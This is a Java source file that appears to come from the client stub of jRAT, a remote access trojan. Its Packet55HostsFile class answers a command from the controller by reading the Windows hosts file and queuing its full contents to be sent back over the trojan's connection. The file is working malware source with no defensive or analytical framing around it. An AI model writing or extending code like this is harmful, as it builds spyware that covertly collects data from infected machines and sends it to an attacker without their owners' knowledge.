package pro.jrat.stub.packets.incoming;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.InputStreamReader;

import pro.jrat.stub.Connection;
import pro.jrat.stub.packets.outgoing.Packet38HostFile;

import com.redpois0n.common.OperatingSystem;


public class Packet55HostsFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts")));
			String tosend = "";
			
			String line;
			
			while ((line = reader.readLine()) != null) {
				tosend += line + "\n";
			}
			reader.close();
			
			Connection.addToSendQueue(new Packet38HostFile(tosend));
		}
	}

}
